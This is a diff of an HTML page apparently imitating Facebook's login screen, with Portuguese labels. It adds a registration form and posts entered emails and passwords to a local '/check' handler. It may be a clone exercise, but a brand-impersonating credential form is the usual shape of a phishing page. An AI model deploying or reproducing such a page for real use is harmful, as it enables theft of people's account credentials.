@@ -9,7 +9,6 @@
     <link rel = "stylesheet" href    = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel = "stylesheet" href    = "/assets/css/main.css">
 </head>
-
 <body>
 <div id    = "div1">
 <div class = "slider">
@@ -25,24 +24,87 @@
 <div class = "login-triangle"></div>
 <h1  class = "login-header">Facebook</h1>
 
-  <form     method = "POST" action         = "/check" class  = "login-container">
+  <form     method = "POST" action         = "/check" class      = "login-container">
   <p><input type   = "email" name          = "email" placeholder = "Email"></p>
   <p><input id     = "password-field" name = "senha"type         = "password" class = "form-control" name = "password" placeholder = "Senha">
     
       <abbr title = "Ver senha"><span toggle = "#password-field" class = "fa fa-fw fa-eye field-icon toggle-password"></span></abbr>
     </p>
-    <p><input type  = "submit" value       = "Entrar"></p>
-    <span     class = "msg_error"><i class = "fa fa-exclamation-triangle"></i>Tentativa Inválida </span>
+    <p><input type = "submit" value = "Entrar"></p>
+
+    <span class = "msg_error"><i class = "fa fa-exclamation-triangle"></i>Tentativa Inválida </span>
+
+
+
+
     </form>
-    <form         method = "POST" action                                                                                              = "/app/view/cad.php" class = "login-container">
-    <p><hr><input style  = "display:flex;justify-content: center;background-color:#42b72a;margin:10px;margin:10px 19px; width: 88%" type = "submit" value            = "Cadastre-se"></p>
+    <form method = "POST"  onclick = 'exibeDiv()' class = "login-container">
+
+    <p><hr><input style = "display:flex;justify-content: center;background-color:#42b72a;margin:10px;margin:10px 19px; width: 88%" type = "submit" value = "Cadastre-se"></p>
     </form>
 </div>
-</div> 
+</div>
+
+
+
+<!--Cadastro de pessoas-->
+<div class = "containercad" >
+<a   class = "links" id = "paracadastro"></a>
+<a   class = "links" id = "paralogin"></a>
+<div class = "content">
+      <!--FORMULÁRIO DE LOGIN-->
+      <div  id     = "login">
+      <form method = "post" action = "">
+          <h1>Login</h1> 
+          <p> 
+            <label for = "email_login">Seu e-mail</label>
+            <input id  = "email_login" name = "email_login" required = "required" type = "text" placeholder = "contato@htmlecsspro.com"/>
+          </p>         
+          <p> 
+            <label for = "senha_login">Sua senha</label>
+            <input id  = "senha_login" name = "senha_login" required = "required" type = "password" placeholder = "1234" />
+          </p>         
+          <p> 
+            <input type = "checkbox" name = "manterlogado" id = "manterlogado" value = "" />
+            <label for  = "manterlogado">Manter-me logado</label>
+          </p>      
+          <p> 
+            <input type = "submit" value = "Logar" />
+          </p>         
+          <p class = "link">
+            Ainda não tem conta?
+            <a href = "#paracadastro">Cadastre-se</a>
+          </p>
+        </form>
+      </div>
+      <!--FORMULÁRIO DE CADASTRO-->
+      <div  id     = "cadastro">
+      <form method = "post" action = "">
+          <h1>Cadastro</h1>          
+          <p> 
+            <label for = "nome_cad">Seu nome</label>
+            <input id  = "nome_cad" name = "nome_cad" required = "required" type = "text" placeholder = "Guilherme Cavenaghi" />
+          </p>          
+          <p> 
+            <label for = "email_cad">Seu e-mail</label>
+            <input id  = "email_cad" name = "email_cad" required = "required" type = "email" placeholder = "contato@htmlecsspro.com"/>
+          </p>          
+          <p> 
+            <label for = "senha_cad">Sua senha</label>
+            <input id  = "senha_cad" name = "senha_cad" required = "required" type = "password" placeholder = "1234"/>
+          </p>          
+          <p> 
+            <input type = "submit" value = "Cadastrar"/>
+          </p>          
+          </p>
+        </form>
+      </div>
+    </div>
+  </div> 
 </body>
 </html>
 
 <script src = "https://code.jquery.com/jquery-1.9.1.js"></script>
 <script src = "/assets/js/glider.js"></script>
 <script src = "/assets/js/unmask.js"></script>
-
+<script src = "/assets/js/opencad.js"></script>
